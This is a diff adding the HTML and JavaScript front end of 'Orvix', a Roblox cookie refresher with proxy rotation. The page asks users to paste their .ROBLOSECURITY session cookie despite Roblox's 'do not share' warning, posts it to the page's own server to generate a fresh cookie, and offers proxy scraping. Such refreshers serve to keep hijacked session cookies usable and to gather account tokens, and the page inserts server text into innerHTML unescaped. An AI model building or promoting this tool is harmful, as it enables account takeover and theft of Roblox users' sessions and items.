@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Orvix — Roblox Cookie Refresher</title>
+  <link rel="stylesheet" href="/static/style.css" />
+</head>
+<body>
+  <div class="shell">
+    <header>
+      <h1>Orvix</h1>
+      <p class="tag">roblox cookie refresher · proxy rotation</p>
+    </header>
+
+    <main>
+      <section class="card">
+        <label for="cookie">Paste your <code>.ROBLOSECURITY</code> cookie</label>
+        <textarea id="cookie" rows="4"
+          placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_...">
+        </textarea>
+        <div class="actions">
+          <button id="btn-refresh" class="primary">Refresh Cookie</button>
+          <button id="btn-validate" class="ghost">Validate Only</button>
+        </div>
+      </section>
+
+      <section id="result" class="card hidden">
+        <h2>Result</h2>
+        <div id="result-body"></div>
+      </section>
+
+      <section class="card stats">
+        <h2>Proxy Pool</h2>
+        <div id="proxy-stats">Loading...</div>
+        <button id="btn-scrape" class="ghost">Re-scrape Proxies</button>
+      </section>
+    </main>
+
+    <footer>
+      <p>made by <a href="https://discord.gg/latentai">latentai</a></p>
+    </footer>
+  </div>
+
+  <script>
+    const $ = (id) => document.getElementById(id);
+
+    async function post(url, body) {
+      const r = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+      });
+      return r.json();
+    }
+
+    async function loadStats() {
+      try {
+        const r = await fetch("/api/proxies");
+        const d = await r.json();
+        $("proxy-stats").innerHTML =
+          `<span class="ok">${d.total}</span> proxies loaded`;
+      } catch {
+        $("proxy-stats").textContent = "Failed to load stats.";
+      }
+    }
+
+    $("btn-refresh").onclick = async () => {
+      const cookie = $("cookie").value.trim();
+      if (!cookie) return alert("Paste a cookie first.");
+      const btn = $("btn-refresh");
+      btn.disabled = true;
+      btn.textContent = "Refreshing...";
+
+      try {
+        const d = await post("/api/refresh", { cookie });
+        showResult(d);
+      } catch (e) {
+        showResult({ ok: false, error: "Request failed: " + e.message });
+      } finally {
+        btn.disabled = false;
+        btn.textContent = "Refresh Cookie";
+      }
+    };
+
+    $("btn-validate").onclick = async () => {
+      const cookie = $("cookie").value.trim();
+      if (!cookie) return alert("Paste a cookie first.");
+      const d = await post("/api/validate", { cookie });
+      showResult({
+        ok: d.ok,
+        valid: d.valid,
+        message: d.valid ? "Cookie is valid." : "Cookie is invalid or expired.",
+      });
+    };
+
+    $("btn-scrape").onclick = async () => {
+      await post("/api/scrape", {});
+      alert("Scrape started. Check back in ~30s.");
+    };
+
+    function showResult(d) {
+      const box = $("result");
+      const body = $("result-body");
+      box.classList.remove("hidden");
+
+      if (d.ok && d.cookie) {
+        body.innerHTML = `
+          <p class="ok">New cookie generated via <b>${d.method || "proxy"}</b>
+          ${d.proxy ? `(${d.proxy})` : ""} in ${d.attempts || "?"} attempt(s).</p>
+          <textarea rows="4" readonly>${d.cookie}</textarea>
+          <button class="ghost" onclick="navigator.clipboard.writeText(this.previousElementSibling.value)">Copy</button>
+        `;
+      } else {
+        body.innerHTML = `
+          <p class="err">${d.error || d.message || "Unknown error."}</p>
+          ${d.attempts ? `<pre>${JSON.stringify(d.attempts, null, 2)}</pre>` : ""}
+        `;
+      }
+    }
+
+    loadStats();
+  </script>
+</body>
+</html>
